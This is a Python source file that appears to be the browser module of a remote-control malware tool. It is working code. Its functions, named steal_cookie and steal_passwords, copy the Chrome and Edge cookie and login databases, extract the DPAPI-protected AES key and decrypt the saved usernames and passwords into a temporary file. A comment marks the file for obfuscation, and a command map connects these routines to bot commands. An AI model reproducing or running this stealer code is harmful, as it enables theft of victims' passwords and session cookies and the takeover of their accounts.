import webbrowser
import config
import os
import shutil
import sqlite3
import json
import base64
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
import constants

# DONT_REMOVE_THIS_COMMENT_IT_SPECIFIES_WHERE_TO_OBFUSCATE_THE_FILE

try:
    import win32crypt
except:
    pass


def open_url(url):
    try:
        webbrowser.open(url)
        return (0, 1)
    except Exception as ex:
        return (1, str(ex))


def steal_cookie():
    cookie_chrome_path = config.appdata_path + \
        'Local/Google/Chrome/User Data/Default/Network/Cookies'
    cookie_edge_path = config.appdata_path + \
        'Local/Microsoft/Edge/User Data/Default/Network/Cookies'
    tmp_cookie_chrome_path = config.tmp_dir_path + 'Chrome cookie'
    tmp_cookie_edge_path = config.tmp_dir_path + 'Edge cookie'

    cookie_paths = {}

    browsers = get_browsers()

    if 'Chrome' in browsers:
        try:
            shutil.copy2(cookie_chrome_path, tmp_cookie_chrome_path)
            cookie_paths['Chrome'] = (0, tmp_cookie_chrome_path)
        except Exception as ex:
            cookie_paths['Chrome'] = (1, 'Error file is busy by browser.')

    if 'Edge' in browsers:
        try:
            shutil.copy2(cookie_edge_path, tmp_cookie_edge_path)
            cookie_paths['Edge'] = (0, tmp_cookie_edge_path)
        except Exception as ex:
            cookie_paths['Edge'] = (1, 'Error file is busy by browser.')

    return cookie_paths


def delete_tmp_cookies():
    tmp_cookie_chrome_path = config.tmp_dir_path + 'Chrome cookie'
    tmp_cookie_edge_path = config.tmp_dir_path + 'Edge cookie'

    if os.path.isfile(tmp_cookie_chrome_path):
        os.remove(tmp_cookie_chrome_path)

    if os.path.isfile(tmp_cookie_edge_path):
        os.remove(tmp_cookie_edge_path)


def get_browsers():
    chrome_path = config.appdata_path + 'Local/Google/Chrome/'
    edge_path = config.appdata_path + 'Local/Microsoft/Edge/'

    browsers = []

    if os.path.isdir(chrome_path):
        browsers.append("Chrome")

    if os.path.isdir(edge_path):
        browsers.append("Edge")

    return browsers


def steal_passwords():
    browsers = get_browsers()
    passwords = ''

    if 'Chrome' in browsers:
        try:
            passwords += steal_chrome_passwords() + '\n\n'
        except Exception as ex:
            passwords += str(ex) + '\n\n'

    if 'Edge' in browsers:
        try:
            passwords += steal_edge_passwords()
        except Exception as ex:
            passwords += str(ex)

    with open(config.tmp_passwords_path, 'w') as file:
        file.write(passwords)

    return config.tmp_passwords_path


def delete_tmp_passwords():
    if os.path.isfile(config.tmp_passwords_path):
        os.remove(config.tmp_passwords_path)


def steal_chrome_passwords():
    passwords_chrome_path = config.appdata_path + \
        'Local/Google/Chrome/User Data/Default/Login Data'
    localstate_chrome_path = config.appdata_path + \
        'Local/Google/Chrome/User Data/Local State'

    key = get_encryption_key(localstate_chrome_path)

    db_path = passwords_chrome_path

    file_path = config.tmp_dir_path + "ChromeData.db"
    shutil.copyfile(db_path, file_path)

    db = sqlite3.connect(file_path)
    cursor = db.cursor()

    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

    answer = '+++ Chrome passwords:\n'
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            answer += f"Origin URL: {origin_url}\n"
            answer += f"Action URL: {action_url}\n"
            answer += f"Username: {username}\n"
            answer += f"Password: {password}\n"
        else:
            continue
        if date_created != 86400000000 and date_created:
            answer += f"Creation date: {str(get_chrome_datetime(date_created))}\n"
        if date_last_used != 86400000000 and date_last_used:
            answer += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"
        answer += "=" * 50 + '\n'
    cursor.close()
    db.close()

    if os.path.isfile(file_path):
        os.remove(file_path)

    return answer


def steal_edge_passwords():
    passwords_edge_path = config.appdata_path + \
        'Local/Microsoft/Edge/User Data/Default/Login Data'
    localstate_edge_path = config.appdata_path + \
        'Local/Microsoft/Edge/User Data/Local State'

    key = get_encryption_key(localstate_edge_path)

    db_path = passwords_edge_path

    file_path = config.tmp_dir_path + "EdgeData.db"
    shutil.copyfile(db_path, file_path)

    db = sqlite3.connect(file_path)
    cursor = db.cursor()

    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

    answer = '+++ Edge passwords:\n'

    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            answer += f"Origin URL: {origin_url}\n"
            answer += f"Action URL: {action_url}\n"
            answer += f"Username: {username}\n"
            answer += f"Password: {password}\n"
        else:
            continue
        if date_created != 86400000000 and date_created:
            answer += f"Creation date: {str(get_chrome_datetime(date_created))}\n"
        if date_last_used != 86400000000 and date_last_used:
            answer += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"
        answer += "=" * 50 + '\n'
    cursor.close()
    db.close()

    if os.path.isfile(file_path):
        os.remove(file_path)

    return answer


def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key(local_state_path):

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):

    try:
        iv = password[3:15]
        password = password[15:]

        cipher = AES.new(key, AES.MODE_GCM, iv)

        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:

            return ""


modes = {constants.BROWSER_OPENURL_preview: constants.BROWSER_OPENURL,
         constants.BROWSER_STEALCOOKIE_preview: constants.BROWSER_STEALCOOKIE,
         constants.BROWSER_STEALPASSWORDS_preview: constants.BROWSER_STEALPASSWORDS}
